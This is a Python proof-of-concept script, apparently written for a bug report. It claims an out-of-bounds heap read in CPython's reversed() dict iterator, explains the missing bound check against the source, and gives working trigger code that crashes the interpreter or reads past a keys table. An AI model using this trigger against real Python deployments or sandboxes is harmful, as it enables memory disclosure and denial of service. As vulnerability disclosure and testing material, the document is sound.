"""reversed(dict) reads DK_UNICODE_ENTRIES(k)[di_pos] with NO upper bound.

Objects/dictobject.c:dictreviter_iter_lock_held

    Py_ssize_t i = di->di_pos;
    PyDictKeysObject *k = d->ma_keys;
    ...
    if (i < 0) { goto fail; }                       # :6272  ONLY bound check
    ...
        PyDictUnicodeEntry *entry_ptr = &DK_UNICODE_ENTRIES(k)[i];   # :6283
        while (entry_ptr->me_value == NULL) {                        # :6284
            if (--i < 0) { goto fail; }
            entry_ptr--;
        }
        key   = entry_ptr->me_key;                                   # :6290
        value = entry_ptr->me_value;                                 # :6291

`di_pos` is seeded at dictiter_new():5636 with `load_keys_nentries(dict) - 1`,
i.e. the dk_nentries of the keys object that existed when reversed() was called.
The only staleness check is `di->di_used != d->ma_used` (:6261) -- a check on
ma_used, which says nothing about dk_nentries.

The three FORWARD iterators are the guarded twin.  Each of them bounds `i`
against the CURRENT dk_nentries before dereferencing:

    dictiter_iternextkey_lock_held    :5740  Py_ssize_t n = k->dk_nentries;
                                      :5747  if (i >= n) goto fail;
    dictiter_iternextvalue_lock_held  :5863  :5870
    dictiter_iternextitem_lock_held   :5987  :5994

They can afford a weaker seed because their di_pos starts at 0 and only grows.
The reverse iterator starts at the far end, so it is the one that needs the
bound -- and it is the one that does not have it.

Recipe: build a dict with many entries, delete all but one (dk_nentries stays
high, ma_used drops to 1), take reversed(), then clear() + reinsert one key so
the dict gets a fresh PyDict_MINSIZE keys object with 5 usable entries and
ma_used back to 1.  di_used == ma_used passes; di_pos is still N-1.

Expected: out-of-bounds read ~ (N-1-5) * sizeof(PyDictUnicodeEntry) past the
end of a 8-slot keys object.  ASan reports heap-buffer-overflow; large N
SIGSEGVs outright.
"""

import sys

N = int(sys.argv[1]) if len(sys.argv) > 1 else 60000


def main():
    d = {}
    for i in range(N):
        d["k%d" % i] = i
    for i in range(N - 1):
        del d["k%d" % i]
    assert len(d) == 1

    it = reversed(d)  # di_pos = dk_nentries - 1 = N - 1

    d.clear()  # ma_keys = Py_EMPTY_KEYS
    d["z"] = 1  # fresh PyDict_MINSIZE keys: 5 usable entries, ma_used = 1

    print("[main] len(d) =", len(d), "  di_pos is still ~", N - 1, flush=True)
    print("[main] next(it) -> reads entries[%d] of a 5-entry table" % (N - 1),
          flush=True)
    got = next(it)
    print("[main] survived; next(it) =", repr(got), flush=True)
    print("[main] type =", type(got), flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
